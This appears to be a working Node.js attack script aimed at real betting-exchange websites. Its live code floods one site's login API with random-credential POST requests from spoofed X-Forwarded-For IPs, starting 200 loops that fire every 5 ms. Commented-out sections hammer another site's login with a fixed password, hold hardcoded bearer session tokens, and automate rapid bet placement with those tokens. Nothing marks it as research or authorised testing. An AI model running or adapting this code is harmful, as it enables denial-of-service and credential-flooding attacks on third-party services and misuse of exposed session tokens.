const { default: axios } = require("axios");
const uid = require("harsh-uid");

const ip = () => {
  const segment1 = Math.floor(Math.random() * 256);
  const segment2 = Math.floor(Math.random() * 256);
  const segment3 = Math.floor(Math.random() * 256);
  const segment4 = Math.floor(Math.random() * 256);

  return `${segment1}.${segment2}.${segment3}.${segment4}`;
};

let time = 0;
let req = 0;

const checkSpeed = () => {
  time++;
  const curSpeed = `${Math.round(req / time)} req per second`;
  console.log("Cuurent speed: " + curSpeed);
};

setInterval(checkSpeed, 1000);

// let resp = 0;

// const hitApi = async () => {
//   try {
//     const curIp = ip();
//     // console.log("IP is", curIp);
//     const domain = "https://www.sairamexchange.com/";

//     const headers = {
//       "X-Forwarded-For": curIp,
//       Origin: domain,
//       Referer: domain,
//       "Content-Type": "application/json",
//     };

//     const data = {
//       userName: "exchange",
//       password: "Abcd1234",
//     };

//     const config = {
//       method: "post",
//       maxBodyLength: Infinity,
//       url: "https://www.sairamexchange.com/app/users/userLogin",
//       headers,
//       data,
//     };

//     axios
//       .request(config)
//       .then(({ data }) => {
//         // console.log("Data:", data.data);
//         // console.log("success");
//         console.log(new Date());
//       })
//       .catch((err) => {
//         // console.log(err);
//         // console.log("fail");
//       });
//     req++;
//   } catch (err) {
//     // console.log("🚀 ~ file: index.js:24 ~ hitApi ~ err:", err.response.data);
//   }
// };

// for (let index = 0; index < 2; index++) {
//   hitApi();
// }

const hitApi2 = async () => {
  try {
    const curIp = ip();
    // console.log("IP is", curIp);
    const domain = "https://lotusbook.io/";

    const headers = {
      "X-Forwarded-For": curIp,
      Origin: domain,
      Referer: domain,
      "Content-Type": "application/json",
    };

    const data = {
      username: uid(10),
      password: uid(10),
      recaptchaResponse: "",
      answer: "",
      token: "",
    };

    const config = {
      method: "post",
      maxBodyLength: Infinity,
      url: "https://lotusbook.io/api/auth/login",
      headers,
      data,
    };

    for (let i = 0; i < 3; i++) {
      axios
        .request(config)
        .then(({ data }) => {
          // console.log("Data:", data.data);
          // console.log("success");
        })
        .catch((err) => {
          // console.log(err.response.data);
          // console.log("fail", new Date().toString());
        });
      req++;
    }
  } catch (err) {
    // console.log("🚀 ~ file: index.js:24 ~ hitApi ~ err:", err.response.data);
  }
};

for (let index = 0; index < 200; index++) {
  setInterval(hitApi2, 5);
}

// hitApi2();

// const token =
//   "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZW1iZXJDb2RlIjoiTEczVDBSMFNNMU4iLCJ0b2tlbklkIjoiZGFkMWIzMDYxN2IxZTE1MzhhNmNlN2E5NzljOTczNGY1ZGY3ODcyOGUyYzJkMWZmOTc1NGU3MmZjYjljMzVlYSIsImxvZ2luQ291bnRyeSI6IklOIiwic2Vzc2lvbklkIjoiNjk4NmMwNTI1NTNkNGNlMGNlOTFhNDZhNWU2YjhkMDcxODUzNzAzMDg3ZWUyZmI3YTcxNjQzMmIxMWMxMDc5NyIsImFsbG93U2hha3RpUHJvIjpmYWxzZSwibGFzdExvZ2luVGltZSI6MTcyNDczMjgwNzAwMCwibmJmIjoxNzI2MDU0OTA4LCJsb2dpbk5hbWUiOiJraDA0NCIsImxvZ2luSVAiOiIxMDMuMTM1LjYyLjAiLCJ0aGVtZSI6ImxvdHVzLWUiLCJleHAiOjE3MjYwOTA5MDgsImlhdCI6MTcyNjA1NDkwOCwibWVtYmVySWQiOjY5OTI3NDUsInVwbGluZXMiOnsiQ09ZIjp7InVzZXJJZCI6MSwidXNlckNvZGUiOiJhZG1pbi51c2VyIn0sIlNNQSI6eyJ1c2VySWQiOjIxMTMzMDAsInVzZXJDb2RlIjoiTEczVCJ9LCJNQSI6eyJ1c2VySWQiOjYzOTIzMzQsInVzZXJDb2RlIjoiTEczVDBSIn0sIkFnZW50Ijp7InVzZXJJZCI6NjQ0MzYyNywidXNlckNvZGUiOiJMRzNUMFIwUyJ9fSwiY3VycmVuY3kiOiJJTlIiLCJpc0RlbW8iOmZhbHNlLCJtYSI6bnVsbCwiYiI6bnVsbCwicyI6bnVsbCwiYyI6bnVsbH0.TXLf2fyjrwo6dOfzVvjsinRbrUz2lqhuKg90FK73bSk";

// const headers = {
//   authorization: token,
//   "content-type": "application/json",
//   accept: "application/json",
//   origin: "https://lotusbook.io",
//   referer: "https://lotusbook.io/",
//   "user-agent":
//     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
//   "x-app-version": "4.0.19.2",
//   "x-client": "mobile",
//   "x-client-id": "451012928.1605029998",
//   "x-client-info": "e883e9a15db99de2fdd0579c576a0693",
//   "x-log-timing": "true",
//   "x-user-id": "LG3T0R0SM0H",
//   "x-xid": "6b76ff17-70d2-b5fe-2373-08f62ee312af",
// };

// const placeBet = async (price) => {
//   try {
//     let data = JSON.stringify([
//       {
//         side: 0,
//         price,
//         selectionId: 12,
//         btype: "ODDS",
//         oddsType: null,
//         eventTypeId: "4",
//         marketId: "1.53089511.340._BR",
//         totalSize: 100,
//         betSlipRef: 0,
//         fromOneClick: 0,
//         betDelay: 5,
//         line: null,
//       },
//     ]);

//     let config = {
//       method: "post",
//       maxBodyLength: Infinity,
//       url: "https://lotusbook.io/api/exchange/order/",
//       headers,
//       data,
//     };

//     const { data: res } = await axios(config);
//     console.log("🚀 ~ file: index.js:157 ~ placeBet ~ res:", res);
//   } catch (err) {
//     console.log(
//       "🚀 ~ file: index.js:129 ~ placeBet ~ err:",
//       err.response.data.error
//     );
//   }
// };

// placeBet();

// const getOdds = async () => {
//   try {
//     let config = {
//       method: "get",
//       maxBodyLength: Infinity,
//       url: "https://lotusbook.io/api/exchange/odds/sma-event/4/53089511",
//       headers,
//     };

//     const { data: res } = await axios(config);
//     const { price } = res.result[0].runners[0].back[0];
//     // console.log("price", price);
//     // const newPrice = (price + 0.009).toFixed(3).toString();
//     // console.log("new price", newPrice);
//     // placeBet(price);
//     for (let index = 0; index < 2; index++) {
//       placeBet(price);
//     }
//   } catch (err) {
//     console.log("��� ~ file: index.js:159 ~ getOdds ~ err:", err);
//   }
// };

// setInterval(getOdds, 1);

// getOdds();

const token =
  "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLm9jZWFuZXhjaDkuY29tXC9hcGlcL2F1dGgiLCJpYXQiOjE3MjYxMTUxOTQsImV4cCI6MTcyNjE1ODM5NCwibmJmIjoxNzI2MTE1MTk0LCJqdGkiOiJmQzdOZngydHZFeGFMbzJsIiwic3ViIjoxMTA5MCwicHJ2IjoiODdlMGFmMWVmOWZkMTU4MTJmZGVjOTcxNTNhMTRlMGIwNDc1NDZhYSJ9._l19UzQqD-XlJgIbb1MR3UvRarONoxpZKjGpGN4YNdo";

const headers = {
  Authorization:
    "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLm9jZWFuZXhjaDkuY29tXC9hcGlcL2F1dGgiLCJpYXQiOjE3MjYxMTUxOTQsImV4cCI6MTcyNjE1ODM5NCwibmJmIjoxNzI2MTE1MTk0LCJqdGkiOiJmQzdOZngydHZFeGFMbzJsIiwic3ViIjoxMTA5MCwicHJ2IjoiODdlMGFmMWVmOWZkMTU4MTJmZGVjOTcxNTNhMTRlMGIwNDc1NDZhYSJ9._l19UzQqD-XlJgIbb1MR3UvRarONoxpZKjGpGN4YNdo",
  "Content-Type": "application/x-www-form-urlencoded",
  Accept: "application/json, text/plain, */*",
  Referer: "https://oceanexch9.com/",
  "Sec-CH-UA":
    '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
  "Sec-CH-UA-Mobile": "?0",
  "Sec-CH-UA-Platform": '"macOS"',
  "User-Agent":
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
};

// const placeBet = async (price) => {
//   try {
//     let data = new FormData();

//     data.append("bet_details[market_id]", "1.232864184");
//     data.append("bet_details[selection_id]", "2609424");
//     data.append("bet_details[side]", "b3");
//     data.append("bet_details[rate]", "1.55");
//     data.append("bet_details[price]", "74.75");
//     data.append("bet_details[fancy_rate]", "");
//     data.append("bet_details[stake]", "10");
//     data.append("bet_details[event_id]", "10");
//     data.append("bet_details[token]", "XwUf4bxlZY");

//     let config = {
//       method: "post",
//       maxBodyLength: Infinity,
//       url: "https://api.oceanexch9.com/api/client/store_order",
//       headers,
//       data,
//     };

//     const { data: res } = await axios(config);
//     console.log("🚀 ~ file: index.js:157 ~ placeBet ~ res:", res);
//   } catch (err) {
//     console.log(
//       "🚀 ~ file: index.js:129 ~ placeBet ~ err:",
//       err.response.data.error
//     );
//   }
// };

// placeBet();
